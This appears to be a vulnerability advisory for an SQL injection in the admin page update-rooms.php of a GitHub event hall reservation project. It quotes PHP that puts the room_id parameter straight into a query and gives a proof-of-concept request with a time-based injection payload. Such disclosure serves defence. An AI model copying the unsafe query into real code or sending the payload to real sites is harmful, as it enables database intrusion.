# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - SQL Injection update-rooms.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/
> 
## Affected Component
> /admin/update-rooms.php

## Code
```php
<?php 
                if(isset($_GET['room_id'])){
                    $room_id1=$_GET['room_id'];
                    $sql1="SELECT * FROM tbl_rooms WHERE room_id='$room_id1'";
                    $res1=mysqli_query($conn,$sql1);
                    if($res1==True){
                        while($row=mysqli_fetch_assoc($res1)){
                            $room_name=$row['room_name'];
                            $room_number=$row['room_number'];
                            $capacity=$row['capacity'];
                            $location=$row['location'];
                            $description=$row['description'];
                            $img_name=$row['img_name'];
                        }
                    }
                }
                ?>
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/update-rooms.php?id=1&room_id='+or+1%3dsleep(5)+%23 
Host: [REDACTED]
```

## Screenshot


